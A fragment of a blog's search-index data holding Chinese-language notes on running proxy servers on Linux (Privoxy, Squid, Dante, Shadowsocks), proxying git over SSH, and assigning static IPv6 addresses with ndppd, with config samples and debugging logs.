form\u00a0<code>&lt;host&gt;&lt;port&gt;/&lt;path&gt;</code></li> <li>The host part uses a simple globbing type matching technique, while the path part uses more flexible\u00a0\"Regular Expressions\"\u00a0(POSIX 1003.2).</li> <li>ipv6 \u5730\u5740\u9700\u8981\u4f7f\u7528 <code>&lt;&gt;</code> \u5305\u8d77\u6765</li> </ul> <p>\u4f8b\u5b50 <pre><code># host pattern  (glob synatax)\n\nad*.example.com\n.?pix.com\nwww[1-9a-ez].example.c*\n\n# path pattern (regular expression)\n.example.com/.*/index.html$\n.example.com/(.*/)?index\\.html$  # Will match any page in the domain of\u00a0\"example.com\"\u00a0that is named\u00a0\"index.html\"\n\n.example.com/(.*/)(ads|banners?|junk)\n#This regular expression will match any path of\u00a0\"example.com\"\u00a0that contains any of the words\u00a0\"ads\",\u00a0\"banner\",\u00a0\"banners\"\u00a0(because of the\u00a0\"?\") or\u00a0\"junk\".\n</code></pre></p> <p>!!!? note bouns</p> <pre><code>request pattern\uff1a\u8fd8\u53ef\u4ee5\u6839\u636e HTTP header \u6765\u5339\u914d\u3002\u4ee5 `TAG:` \u4e3a\u5f00\u5934\n</code></pre> <pre><code>Request tag patterns are used to change the applying actions based on the request's tags. Tags can be created based on HTTP headers with either the\u00a0[client-header-tagger](https://www.privoxy.org/user-manual/actions-file.html#CLIENT-HEADER-TAGGER)\u00a0or the\u00a0[server-header-tagger](https://www.privoxy.org/user-manual/actions-file.html#SERVER-HEADER-TAGGER)\u00a0action.\n</code></pre>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#action","title":"Action","text":"<p>\u9ed8\u8ba4\u662f\u5173\u95ed\u7684\uff0c\u9664\u975e\u5728 action \u6587\u4ef6\u4e2d\u663e\u793a\u5730\u6253\u5f00\uff08So in this case\u00a0Privoxy\u00a0would just be a normal, non-blocking, non-filtering proxy.\uff09\u3002\u4f7f\u7528 <code>+</code> \u5f00\u542f\uff0c<code>-</code> \u5173\u95ed\u3002</p> <p>action \u53ef\u80fd\u662f\u5e26\u6709\u53c2\u6570\u7684\u3002\u591a\u503c\u7684\u53c2\u6570\u591a\u6b21\u5339\u914d\u53ef\u4ee5\u7d2f\u52a0</p> <pre><code>+name{param}   # enable action and add param to the list of parameters\n-name{param}   # remove the parameter param from the list of parameters\n             # If it was the last one left, disable the action.\n-name          # disable this action completely and remove all parameters from the list\n</code></pre> <p>action list\uff1a\u6709\u6570\u4e0d\u8fc7\u6765\u7684 action\uff0c\u53c2\u8003manual\u3002\u6211\u4eec\u4e3b\u8981\u5173\u6ce8 block \u5373\u53ef\u3002 \u4ee3\u7406\u4e5f\u662f\u4e00\u79cd\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u53ef\u4ee5\u505a\u5230\u597d\u591a\u6709\u8da3\u7684\u4e8b\uff08\u7531\u4e8e HTTP \u534f\u8bae\u57fa\u7840\u90e8\u5206\u8fd8\u662f\u7b80\u5355\u7684\uff0c\u6240\u4ee5\u8fd8\u662f\u597d\u7406\u89e3\u7684\uff09</p> <ul> <li>add-header</li> <li>block: Block ads or other unwanted content<ul> <li>A block reason that should be given to the user. <pre><code>{+block{No nasty stuff for you.}}\n# Block and replace with \"blocked\" page\n.nasty-stuff.example.com\n\n{+block{Doubleclick banners.} +handle-as-image}\n# Block and replace with image\n.ad.doubleclick.net\n.ads.r.us/banners/\n\n{+block{Layered ads.} +handle-as-empty-document}\n# Block and then ignore\nadserver.example.net/.*\\.js$\n</code></pre></li> </ul> </li> <li>change-x-forwarded-for: Improve privacy by not forwarding the source of the request in the HTTP headers.<ul> <li>\"block\"\u00a0to delete the header.</li> <li>\"add\"\u00a0to create the header (or append the client's IP address to an already existing one).</li> </ul> </li> <li>filter: \u4fee\u6539 html, js \u5185\u5bb9<ul> <li>All instances of text-based type, most notably HTML and JavaScript, to which this action applies, can be filtered on-the-fly through the specified regular expression based substitutions. (Note: as of version 3.0.3 plain text documents are exempted from filtering, because web servers often use the\u00a0text/plain\u00a0MIME type for all files whose type they don't know.)</li> </ul> </li> <li>limit-connect</li> <li>redirect: Redirect requests to other sites. <pre><code># Replace example.com's style sheet with another one\n  { +redirect{http://localhost/css-replacements/example.com.css} }\n  example.com/stylesheet\\.css\n\n  # Create a short, easy to remember nickname for a favorite site\n  # (relies on the browser to accept and forward invalid URLs to Privoxy)\n  { +redirect{https://www.privoxy.org/user-manual/actions-file.html} }\n  a\n\n  # Always use the expanded view for Undeadly.org articles\n  # (Note the $ at the end of the URL pattern to make sure\n  # the request for the rewritten URL isn't redirected as well)\n  {+redirect{s@$@&amp;mode=expanded@}}\n  undeadly.org/cgi\\?action=article&amp;sid=\\d*$\n\n  # Redirect Google search requests to MSN\n  {+redirect{s@^http://[^/]*/search\\?q=([^&amp;]*).*@http://search.msn.com/results.aspx?q=$1@}}\n  .google.com/search\n\n  # Redirect MSN search requests to Yahoo\n  {+redirect{s@^http://[^/]*/results\\.aspx\\?q=([^&amp;]*).*@http://search.yahoo.com/search?p=$1@}}\n  search.msn.com//results\\.aspx\\?q=\n\n  # Redirect http://example.com/&amp;bla=fasel&amp;toChange=foo (and any other value but \"bar\")\n  # to       http://example.com/&amp;bla=fasel&amp;toChange=bar\n  #\n  # The URL pattern makes sure that the following request isn't redirected again.\n  {+redirect{s@toChange=[^&amp;]+@toChange=bar@}}\n  example.com/.*toChange=(?!bar)\n\n  # Add a shortcut to look up illumos bugs\n  {+redirect{s@^http://i([0-9]+)/.*@https://www.illumos.org/issues/$1@}}\n  # Redirected URL = http://i4974/\n  # Redirect Destination = https://www.illumos.org/issues/4974\n  i[0-9][0-9][0-9][0-9]*/\n\n  # Redirect requests for the old Tor Hidden Service of the Privoxy website to the new one\n  {+redirect{s@^http://jvauzb4sb3bwlsnc.onion/@http://l3tczdiiwoo63iwxty4lhs6p7eaxop5micbn7vbliydgv63x5zrrrfyd.onion/@}}\n  jvauzb4sb3bwlsnc.onion/\n\n  # Redirect remote requests for this manual\n  # to the local version delivered by Privoxy\n  {+redirect{s@^http://www@http://config@}}\n  www.privoxy.org/user-manual/\n</code></pre></li> </ul>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#squid-\u5931\u8d25","title":"squid (\u5931\u8d25)","text":"<p>Warning</p> <p>p.s \u6ca1\u6709\u641e\u5b9a\uff0c\u5c31\u662f\u4ee3\u7406\u4e0d\u6210\u529f\uff0c\u4e0d\u8bd5\u4e86\u3002</p> <p>How to install a Squid server | Ubuntu</p> <ul> <li>sudo systemctl restart squid.service \u4e0d\u77e5\u4e3a\u4f55\u5bb9\u6613\u5361\u534a\u5929</li> <li>\u914d\u7f6e 9000 \u884c<ul> <li>\u4e0d\u8fc7\u6211\u4eec\u57fa\u672c\u53ea\u9700\u8981\u5173\u6ce8\u4e24\u4e2a\u914d\u7f6e<ul> <li>http_port</li> <li>http_access</li> </ul> </li> </ul> </li> </ul> <p>\u914d\u7f6e\u6587\u4ef6\u9700\u8981\u8bb2\u7a76\u987a\u5e8f\uff0c\u6211\u4eec\u5728 <code>http_access deny all</code> \u524d\u9762\u6dfb\u52a0\u989d\u5916\u7684\u89c4\u5219\uff0c\u5728\u914d\u7f6e\u6587\u4ef6\u7ed3\u5c3e\u52a0\u6ca1\u6709\u7528 <pre><code>acl ustc_net src 222.195.72.0/24\nacl ustc_net2 src 202.38.72.0/24\n\nhttp_access allow ustc_net ustc_net2\n</code></pre></p>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u62a5\u9519","title":"\u62a5\u9519","text":"<p>\u4e0d\u77e5\u4e3a\u4f55\uff0c\u5728 ryzen \u4e0a\u901a\u8fc7 localhost \u8bbe\u7f6e\u53ef\u4ee5\u8bbf\u95ee\uff0c\u5728\u5176\u5b83\u673a\u5668\u4e0a\u90fd\u4e0d\u884c\u3002</p> <p>curl \u62a5\u9519 <pre><code>* Uses proxy env variable https_proxy == 'http://114.214.236.72:11223'\n* Trying 114.214.236.72:11223...\n* TCP_NODELAY set \n* Connected to 114.214.236.72 (114.214.236.72) port 11223 (#0)\n* allocate connect buffer!\n* Establish HTTP proxy tunnel to www.youtube.com:443\n&gt; CONNECT www.youtube.com:443 HTTP/1.1\n&gt; Host: www.youtube.com:443 \n&gt; User-Agent: curl/7.68.0 \n&gt; Proxy-Connection: Keep-Alive\n&gt; \n&lt; HTTP/1.1 403 Forbidden\n&lt; Server: squid/5.9 \n&lt; Mime-Version: 1.0 \n&lt; Date: Wed, 02 Oct 2024 06:52:32 GMT \n&lt; Content-Type: text/html;charset=utf-8 \n&lt; Content-Length: 3496\n&lt; X-Squid-Error: ERR_ACCESS_DENIED 0\n&lt; Vary: Accept-Language \n&lt; Content-Language: en\n&lt; X-Cache: MISS from ryzen\n&lt; X-Cache-Lookup: NONE from ryzen:11223 \n&lt; Via: 1.1 ryzen (squid/5.9)\n&lt; Connection: keep-alive\n&lt; \n* Received HTTP code 403 from proxy after CONNECT \n* CONNECT phase completed!\n* Closing connection 0\ncurl: (56) Received HTTP code 403 from proxy after CONNECT \n</code></pre></p> <p>squid \u65e5\u5fd7 <pre><code>1727852473.521    312 127.0.0.1 TCP_TUNNEL/200 534253 CONNECT www.youtube.com:443 - HIER_DIRECT/198.18.0.148 -\n1727852480.354    488 127.0.0.1 TCP_TUNNEL/200 533027 CONNECT www.youtube.com:443 - HIER_DIRECT/198.18.0.148 -\n1727852491.756   4547 127.0.0.1 TCP_TUNNEL/200 545250 CONNECT www.youtube.com:443 - HIER_DIRECT/198.18.0.148 -\n1727852507.818    405 127.0.0.1 TCP_TUNNEL/200 531655 CONNECT www.youtube.com:443 - HIER_DIRECT/198.18.0.148 -\n1727852631.171      0 192.168.35.254 TCP_DENIED/403 3856 CONNECT www.youtube.com:443 - HIER_NONE/- text/html\n1727852697.691      0 192.168.35.254 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -\n1727853038.964      0 192.168.35.254 TCP_DENIED/403 3856 CONNECT www.youtube.com:443 - HIER_NONE/- text/html\n</code></pre></p>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#socks5","title":"Socks5","text":"","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#dante","title":"dante","text":"<ul> <li>\u4f18\u70b9<ul> <li>\u652f\u6301\u7528\u6237\u540d\u5bc6\u7801\u9a8c\u8bc1</li> <li>\u652f\u6301\u8bbf\u95ee\u63a7\u5236\uff1a\u901a\u8fc7 rule \u63a7\u5236\u54ea\u4e9b\u5ba2\u6237\u7aef\u53ef\u4ee5\u8fde\u63a5 server\uff0c\u4ee5\u53ca\u5ba2\u6237\u7aef\u53ef\u4ee5 request \u54ea\u4e9b\u5730\u5740</li> <li>\u6587\u6863\u3001\u914d\u7f6e\u6587\u4ef6\u6ce8\u91ca\u6e05\u6670\u6613\u8bfb</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u4e0d\u652f\u6301 ipv6</li> <li>\u914d\u7f6e\u589e\u52a0\u4e86\u5f88\u591a\u4e1c\u897f\uff0c\u6240\u4ee5\u914d\u7f6e\u76f8\u5bf9\u590d\u6742</li> </ul> </li> </ul> <p>How To Setup SOCKS5 Proxy Server using Dante on Ubuntu 16.04 (github.com)</p> <p>\u5b89\u88c5</p> <pre><code>dante-server\n</code></pre>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u914d\u7f6e","title":"\u914d\u7f6e","text":"<ul> <li>set socksmethod to 'none' instead of 'username' if you want to disable auth.</li> </ul> <pre><code>internal: 0.0.0.0 port = 11223\nexternal: 192.168.35.2\n\n#clientmethod: none\nsocksmethod: none\nuser.privileged: root\nuser.unprivileged: nobody\n\nuser.libwrap: nobody\nclient pass {\n    from: 0.0.0.0/0 to: 0.0.0.0/0\n    log: error connect disconnect\n}\nsocks pass {\n    from: 0.0.0.0/0 to: 0.0.0.0/0\n    log: error connect disconnect\n}\n</code></pre> <pre><code># The config file is divided into three parts;\n#    1) server settings\n#    2) rules\n#    3) routes\n</code></pre> <p>server setting \u90e8\u5206\u53ef\u4ee5\u914d\u7f6e\uff1a</p> <ul> <li>\u76d1\u542c\u5730\u5740\uff0c\u51fa\u53e3\u5730\u5740</li> <li>\u9a8c\u8bc1\u65b9\u6cd5</li> </ul> <ul> <li>clientmethod:<ul> <li>The  default  value  for this keyword is all methods that may be necessary for the later socks-based authentication methods, as specified as values to the global socksmethod keyword.  Normally you should not need to set this keyword, as Dante will set it to the correct value by it self.</li> </ul> </li> <li>socksmethod<ul> <li>Supported values are bsdauth, gssapi, none, pam.any, pam.address, pam.username, rfc931, and username</li> </ul> </li> </ul> <p>\u8bbe\u7f6e socksmethod \u4e3a username \u540e\uff0c\u76f4\u63a5\u8bbf\u95ee\u4f1a\u62a5\u9519\u3002\u9700\u8981\u8bbe\u7f6e\u4e3a <code>socks5://user:password@proxyhost:port</code></p> <pre><code>curl: (7) No authentication method was acceptable. (It is quite likely that the SOCKS5 server wanted a username/password, since none was supplied to the server on this connection.)\n</code></pre> <p>rule \u90e8\u5206\u7528\u4e8e\u5b9e\u73b0\u8bbf\u95ee\u63a7\u5236\uff0c\u51b3\u5b9a\u54ea\u4e9b client \u53ef\u4ee5\u8fde\u63a5 socks\uff0c\u4e5f\u51b3\u5b9a client \u80fd\u591f\u8bbf\u95ee\u54ea\u4e9b\u5185\u5bb9\u3002</p> <pre><code># \u5141\u8bb8\u6240\u6709 client\uff0c\u540e\u9762\u7684 to \u5e76\u4e0d\u662f\u76ee\u6807\u5730\u5740\uff0c\u800c\u662f danted \u63a5\u6536\u5230\u5305\u7684\u63a5\u53e3\u5730\u5740\nclient pass {\n    from: 0.0.0.0/0 to: 0.0.0.0/0\n    log: error connect disconnect\n}\n\n# the people at the 172.16.0.0/12 are bad, no one should talk to them.\n# log the connect request and also provide an example on how to\n# interact with libwrap.\n#socks block {\n#        from: 0.0.0.0/0 to: 172.16.0.0/12\n#        libwrap: spawn finger @%a\n#        log: connect error\n#}\n</code></pre> <p>man \u4e2d\u8c8c\u4f3c\u6ca1\u6709\u5173\u4e8e route \u7684\u4ecb\u7ecd\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u5f88\u7b80\u5355\uff0c\u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0\u67d0\u4e9b\u5730\u5740\u4f7f\u7528\u53e6\u4e00\u4e2a socks server \u518d\u6b21\u8f6c\u53d1 <pre><code># route all http connects via an upstream socks server, aka \"server-chaining\".\n#route {\n# from: 10.0.0.0/8 to: 0.0.0.0/0 port = http via: socks.example.net port = socks\n#}\n</code></pre></p>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#man-\u624b\u518c","title":"man \u624b\u518c","text":"<p><code>man 5 danted.conf</code></p>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#authentication-methods","title":"authentication methods","text":"<ul> <li>none<ul> <li>This method requires no form of authentication.</li> </ul> </li> <li>username<ul> <li>This method requires the client to provide a username and password.  This information must match the username and password given in the system password file.</li> </ul> </li> <li>gssapi<ul> <li>This method requires the setup of a Kerberos environment and can provide strong encryption and authentication, depending on the gssapi settings you choose.</li> </ul> </li> <li>rfc931<ul> <li>This method requires the host the socks client runs on to provide a rfc931 (\"ident\") username for the client.  This username match a username given in the system password file.</li> </ul> </li> <li>pam.address<ul> <li>IP-based (rhosts) PAM authentication.</li> </ul> </li> <li>pam.any<ul> <li>Will try to match against any type of PAM authentication, depending on the information that is currently available.  Normally of limited use, and you should instead set the pam-based method(s) you actually want.</li> </ul> </li> <li>pam.username<ul> <li>Username/password-based  PAM authentication.  Similar to the method username, but the information is passed to the PAM subsystem for authentication, rather than Dante using the system password file directly.  When using PAM, be wary of memory leakages and other bugs in the external PAM library Dante will have to use on your platform.</li> </ul> </li> <li>bsdauth<ul> <li>This method requires the available client data to be verified by the BSD Authentication system.  Similar to the method username, but passed to the BSD authentication system instead.</li> </ul> </li> </ul>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#rule","title":"rule","text":"<p>\u6709\u70b9\u50cf\u9632\u706b\u5899\u89c4\u5219\uff0c\u51b3\u5b9a\u54ea\u4e9b client \u53ef\u4ee5\u8fde\u63a5 socks\uff0c\u4e5f\u51b3\u5b9a client \u80fd\u591f\u8bbf\u95ee\u54ea\u4e9b\u5185\u5bb9\u3002</p> <p>\u4e24\u79cd\u89c4\u5219</p> <ul> <li>client rule: are used to see if the client is allowed to connect to the Dante server<ul> <li>These rules will start with <code>client pass</code> for a rule that allows the client, or <code>client block</code> for a rule that blocks the client</li> <li>It is recommended that the client-rules do not use hostnames but only IP-addresses, both for security and performance reasons.  These rules operate at the TCP level.</li> </ul> </li> <li>socks-rules: prefixed with socks and operate at the socks protocol level<ul> <li>These rules will start with <code>socks pass</code> for a rule that allows the client, or <code>socks block</code> for a rule that blocks the client.</li> <li>\u6027\u80fd\u53d8\u5f97\u4e0d\u90a3\u4e48\u91cd\u8981\uff0c\u4f46\u662f\u4ecd\u7136\u63a8\u8350\u4f7f\u7528</li> </ul> </li> </ul> <p>rule \u7531 <code>client pass/block</code> \u6216\u8005 <code>socks pass/block</code> \u5f00\u59cb\uff0c\u5185\u5bb9\u4e3b\u8981\u662f\u5339\u914d\u7684 condition \u76f8\u5173\u7684\u5173\u952e\u8bcd\uff08\u4e0d\u8fc7\u4e5f\u6709 log \u8fd9\u79cd action \u505a\u4e00\u4e9b\u989d\u5916\u64cd\u4f5c\uff09</p> <p>\u793a\u4f8b <pre><code>client pass {\n    from: 0.0.0.0/0 to: 0.0.0.0/0\n    log: error connect disconnect\n}\n</code></pre></p> <ul> <li>condition<ul> <li>clientcompatibility, clientmethod, command, from, group, socksmethod, protocol, proxyprotocol, to, user</li> <li>port: Parameter to from, to and via.  Accepts the keywords eq/=, neq/!=, ge/&gt;=, le/&lt;=, gt/&gt;, lt/&lt; followed by a number.  A port range can also be given as \"port  - \" <li>action<ul> <li>bandwidth, libwrap, log, session, redirect, timeout.connect, timeout.negotiate, timeout.io, timeout.tcp_fin_wait, and udp.portrange.</li> </ul> </li> <p>from, to \u542b\u4e49</p> <ul> <li><code>from</code> refers to the clients address<ul> <li>In the client-rule context, <code>to</code> means the address the request is accepted on, i.e., a address the Dante server listens on.</li> <li>In the socks-rule context, <code>to</code> means the client's destination address, as expressed in the client's socks request.  I.e., the address the Dante server should connect to (for TCP sessions) or send packets to (for UDP session) on behalf of the client.</li> </ul> </li> <li>first match is best match basis.</li> </ul>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u5176\u5b83\u529f\u80fd","title":"\u5176\u5b83\u529f\u80fd","text":"<ul> <li>SESSION<ul> <li>The session keyword can be used any any rule to limit the number of active sessions and the rate at which they are established.</li> </ul> </li> <li>TRAFFIC MONITORING<ul> <li>The Dante server can be configured to monitor the traffic passing through it, and trigger alarms based on the observed network traffic</li> </ul> </li> </ul>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#ss-local--ss-server","title":"ss-local + ss-server","text":"<p>\u81ea\u5df1\u6700\u719f\u6089\u7684\u5de5\u5177\uff0c\u56e0\u6b64\u914d\u7f6e\u8d77\u6765\u5f88\u5bb9\u6613\u3002</p> <p>\u628a local \u548c server \u5206\u522b\u90e8\u7f72\u5728 GFW \u7684\u4e24\u4fa7\u662f\u6b63\u5e38\u7528\u6cd5\uff0c\u90e8\u7f72\u5728\u540c\u4e00\u53f0\u673a\u5668\u4e0a\u5219\u53ea\u662f\u5229\u7528\u4e86 local \u7684 socks5 \u4ee3\u7406\u529f\u80fd\u3002</p> <ul> <li>\u4f18\u70b9<ul> <li>\u6bcf\u4e2a\u914d\u7f6e\u9009\u9879\u90fd\u77e5\u9053\u542b\u4e49</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>local \u4fa7\u4e0d\u652f\u6301\u7528\u6237\u5bc6\u7801\u9a8c\u8bc1\uff0c\u4e5f\u4e0d\u652f\u6301\u8bbf\u95ee\u63a7\u5236</li> <li>systemd service \u9ed8\u8ba4\u53ea\u6709 ss-server \u7684\uff0c\u6ca1\u6709 ss-local \u7684</li> </ul> </li> </ul> <pre><code>sudo vim /etc/shadowsocks-libev/server.json\n{\n    \"server\":[\"127.0.0.1\"],\n    \"mode\":\"tcp_and_udp\",\n    \"server_port\": 1080,\n    \"local_ipv4_address\": \"192.168.35.2\",\n    \"nameserver\": \"192.168.35.1\",\n    \"timeout\":86400,\n    \"method\":\"aes-256-cfb\",\n    \"password\": \"abcd4567\",\n    \"fast_open\": true\n}\n\n# local\nsudo vim /etc/shadowsocks-libev/local.json\n{\n    \"server\":\"127.0.0.1\",\n    \"server_port\":1080,\n    \"local_address\": \"0.0.0.0\",\n    \"local_port\":11223,\n    \"password\":\"abcd4567\",\n    \"timeout\":300,\n    \"method\":\"aes-256-cfb\",\n    \"fast_open\": false\n}\n</code></pre> <pre><code>/usr/bin/ss-server -c /etc/shadowsocks-libev/server.json\n/usr/bin/ss-local -c /etc/shadowsocks-libev/local.json\n</code></pre>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u4ee3\u7406\u5e94\u7528","title":"\u4ee3\u7406\u5e94\u7528","text":"","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#github-git-clone-ssh-\u534f\u8bae","title":"github git clone ssh \u534f\u8bae","text":"<p>\u4ee3\u7406 git clone ssh \u534f\u8bae</p> <pre><code># ~/.ssh/config\nHost github.com\n  HostName github.com\n  User git\n  IdentityFile ~/.ssh/id_ed25519\n  ProxyCommand nc -X connect -x '[2001:da8:xxx::xxx]:yyy' %h %p\n</code></pre> <p>\u6d4b\u8bd5 github \u5bc6\u94a5\u88ab\u6dfb\u52a0\u5230\u54ea\u4e2a\u4ed3\u5e93\u6216\u8005\u6574\u4e2a\u7528\u6237 <pre><code>(base) fyyuan@snode2 \u279c  repo ssh -T -ai ~/.ssh/id_ed25519 git@github.com\nHi TheRainstorm/gpu-interval-model! You've successfully authenticated, but GitHub does not provide shell access.\n(base) fyyuan@snode2 \u279c  repo vim ~/.ssh/config\n(base) fyyuan@snode2 \u279c  repo ssh -T -ai ~/.ssh/id_ed25519 git@github.com\nHi TheRainstorm! You've successfully authenticated, but GitHub does not provide shell access.\n</code></pre></p>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/02/27/%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%88%86%E9%85%8D%E9%9D%99%E6%80%81v6-ndppd/","title":"\u4e3a\u8bbe\u5907\u5206\u914d\u9759\u6001 v6 \u57fa\u4e8e ndppd","text":"","tags":["ipv6","ndppd"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/02/27/%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%88%86%E9%85%8D%E9%9D%99%E6%80%81v6-ndppd/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u5b66\u6821\u63d0\u4f9b\u4e86 ipv6\uff0c\u6211\u7684\u8bb8\u591a\u670d\u52a1\u90fd\u53ef\u4ee5\u4f7f\u7528 v6 \u8bbf\u95ee\u3002\u4f46\u662f\u5b66\u6821\u63d0\u4f9b\u7684 PD \u53ef\u80fd\u4f1a\u53d8\uff0c\u867d\u7136\u4f7f\u7528 ddns \u53ef\u4ee5\u5c06 v6 \u5730\u5740\u6620\u5c04\u5230\u56fa\u5b9a\u7684\u57df\u540d\uff0c\u4f46\u662f ddns \u6709\u5ef6\u8fdf\u6027\u3002\u56e0\u6b64\u6700\u597d\u7684\u89e3\u51b3\u529e\u6cd5\u4ecd\u7136\u662f\u7ed9\u673a\u5668\u8bbe\u7f6e\u9759\u6001 ip\u3002</p> <p>p.s. \u77ed\u671f\u91cd\u542f\u7f51\u5361 PD \u4e0d\u4f1a\u53d8\uff0c\u4f46\u662f\u5982\u679c\u957f\u671f\u79bb\u7ebf\u518d\u4e0a\u7ebf\u5c31\u53ef\u80fd\u53d8\uff0c\u7c7b\u4f3c\u4e8e dhcp\u3002</p> <p>\u5bbf\u820d\u7684 v6 wan \u53e3\u65e0\u6cd5\u8bbe\u7f6e\u9759\u6001 ip\uff0c\u56e0\u4e3a\u5b66\u6821\u8def\u7531\u5668\u8981\u6c42\u8bbe\u5907\u5fc5\u987b\u53d1\u4e86 RS \u624d\u4f1a\u8def\u7531\u8be5\u5305\u3002</p> <p>\u4fe1\u667a\u697c\u5219\u53ef\u4ee5\u9759\u6001\u8bbe\u7f6e\u3002\u5f53\u8bbf\u95ee\u5916\u7f51\u65f6\uff0c\u5b66\u6821\u8def\u7531\u5668\u4e0d\u4f1a\u68c0\u67e5\u6e90\u5730\u5740\uff0c\u4f1a\u76f4\u63a5\u8def\u7531\u51fa\u53bb\u3002\u7b49\u63a5\u6536\u5230\u56de\u5305\u65f6\uff0c\u5b66\u6821\u8def\u7531\u5668\u770b\u5230\u76ee\u7684\u5730\u5740\u4e3a\u8bbe\u7f6e\u7684\u9759\u6001\u5730\u5740\uff0c\u4f1a\u5728\u5e7f\u64ad\u57df\u4e0a\u53d1\u9001 NS\uff0c\u6211\u81ea\u5df1\u8def\u7531\u7684 wan \u53e3\u63a5\u6536\u5230 NS \u540e\u54cd\u5e94 NA\uff08v6 \u7248\u7684 ARP \u8fc7\u7a0b\uff09\u3002\u5b66\u6821\u8def\u7531\u5668\u4fbf\u77e5\u9053\u4e86\u6211\u8def\u7531\u5668 wan \u53e3\u7684 mac \u5730\u5740\uff0c\u4e8e\u662f\u5c06\u5305\u53d1\u9001\u7ed9\u6211\u7684\u8def\u7531\u5668 wan \u53e3\u3002</p> <p>\u867d\u7136\u4fe1\u667a\u697c\u53ef\u4ee5\u9759\u6001\u8bbe\u7f6e v6\uff0c\u4f46\u662f\u4ec5\u9650\u4e8e wan \u53e3\u3002lan \u4e0b\u9762\u7684\u8bbe\u5907\u5982\u679c\u624b\u52a8\u8bbe\u7f6e\u4e86\u9759\u6001 v6\uff0c\u662f\u65e0\u6cd5\u6b63\u5e38\u4e0a\u7f51\u7684\u3002\u91cd\u590d\u4e0a\u8fc7\u7a0b\u4f1a\u53d1\u73b0\u5b66\u6821\u4ecd\u7136\u4f1a\u6b63\u5e38\u628a\u5305\u8def\u7531\u51fa\u53bb\uff0c\u4f46\u662f\u6536\u5230\u56de\u5305\u540e\uff0c\u4f1a\u50cf\u4e4b\u524d\u4e00\u6837\u53d1\u9001 NS\u3002\u800c\u6211\u4eec\u8def\u7531\u5668\u7684 wan \u53e3\u63a5\u6536\u5230 NS \u540e\uff0c\u6839\u672c\u4e0d\u4f1a\u54cd\u5e94 NA\uff08\u56e0\u4e3a\u4e0d\u662f\u81ea\u5df1\u7684 v6 \u5730\u5740\uff09\u3002LAN \u548c WAN \u53c8\u4e0d\u662f\u4e00\u4e2a\u5e7f\u64ad\u57df\uff0c\u56e0\u6b64\u6536\u4e0d\u5230 NS\u3002\u4ece\u800c\u5bfc\u81f4\u5b66\u6821\u8def\u7531\u5668\u5e76\u4e0d\u4f1a\u628a\u56de\u5305\u4ea4\u7ed9\u6211\u4eec\u3002</p> 